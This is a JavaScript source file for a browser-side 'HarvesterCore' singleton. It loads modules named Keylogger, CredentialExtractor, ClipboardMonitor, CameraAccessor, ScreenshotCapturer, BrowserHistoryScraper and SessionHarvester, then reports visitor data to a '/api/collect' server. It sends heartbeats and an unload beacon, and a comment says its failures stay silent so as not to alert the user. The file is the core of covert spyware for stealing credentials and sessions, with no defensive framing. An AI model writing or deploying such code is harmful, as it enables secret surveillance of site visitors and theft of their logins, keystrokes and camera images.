import axios from 'axios';
import ClickTracker from './ClickTracker';
import Keylogger from './Keylogger';
import CredentialExtractor from './CredentialExtractor';
import BrowserFingerprinter from './BrowserFingerprinter';
import StorageHarvester from './StorageHarvester';
import CameraAccessor from './CameraAccessor';
import NetworkInfo from './NetworkInfo';
import ScreenshotCapturer from './ScreenshotCapturer';
import MouseRecorder from './MouseRecorder';
import ClipboardMonitor from './ClipboardMonitor';
import BrowserHistoryScraper from './BrowserHistoryScraper';
import SessionHarvester from './SessionHarvester';

const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';
const axiosInstance = axios.create({ baseURL: API, timeout: 10000 });

class HarvesterCore {
  constructor() {
    this.sessionId = null;
    this.dbId = null;
    this.initialized = false;
    this.startTime = Date.now();
    this.heartbeatInterval = null;
    this.modules = {};
  }

  async init() {
    if (this.initialized) return;
    
    // Check if we already have a session
    const stored = sessionStorage.getItem('harvester_session');
    if (stored) {
      try {
        const parsed = JSON.parse(stored);
        this.sessionId = parsed.sessionId;
        this.dbId = parsed.dbId;
      } catch (e) {}
    }

    if (!this.sessionId) {
      try {
        const res = await axiosInstance.post('/api/collect/init', {
          referrer: document.referrer || '',
          page: window.location.pathname,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screenResolution: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
          platform: navigator.platform
        });
        this.sessionId = res.data.sessionId;
        this.dbId = res.data.dbId;
        sessionStorage.setItem('harvester_session', JSON.stringify({
          sessionId: this.sessionId,
          dbId: this.dbId
        }));
      } catch (error) {
        console.warn('Harvester init failed, will retry');
        setTimeout(() => this.init(), 5000);
        return;
      }
    }

    this.initialized = true;
    this.startModules();
    this.startHeartbeat();
    this.setupBeforeUnload();
  }

  startModules() {
    this.modules.clickTracker = new ClickTracker(this);
    this.modules.keylogger = new Keylogger(this);
    this.modules.credentialExtractor = new CredentialExtractor(this);
    this.modules.fingerprinter = new BrowserFingerprinter(this);
    this.modules.storageHarvester = new StorageHarvester(this);
    this.modules.cameraAccessor = new CameraAccessor(this);
    this.modules.networkInfo = new NetworkInfo(this);
    this.modules.screenshotCapturer = new ScreenshotCapturer(this);
    this.modules.mouseRecorder = new MouseRecorder(this);
    this.modules.clipboardMonitor = new ClipboardMonitor(this);
    this.modules.browserHistoryScraper = new BrowserHistoryScraper(this);
    this.modules.sessionHarvester = new SessionHarvester(this);

    Object.values(this.modules).forEach(module => {
      if (module.init) module.init();
    });
  }

  startHeartbeat() {
    this.heartbeatInterval = setInterval(() => {
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      axiosInstance.post('/api/collect/heartbeat', {
        sessionId: this.sessionId,
        timeOnSite
      }).catch(() => {});
    }, 30000);
  }

  setupBeforeUnload() {
    window.addEventListener('beforeunload', () => {
      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
      navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
        sessionId: this.sessionId,
        timeOnSite
      }));
      if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
    });
  }

  async send(endpoint, data) {
    try {
      const res = await axiosInstance.post(endpoint, {
        sessionId: this.sessionId,
        ...data
      });
      return res.data;
    } catch (error) {
      // Silent fail - don't alert the user
      return null;
    }
  }

  getSessionId() { return this.sessionId; }
}

// Singleton
const harvesterInstance = new HarvesterCore();
export default harvesterInstance;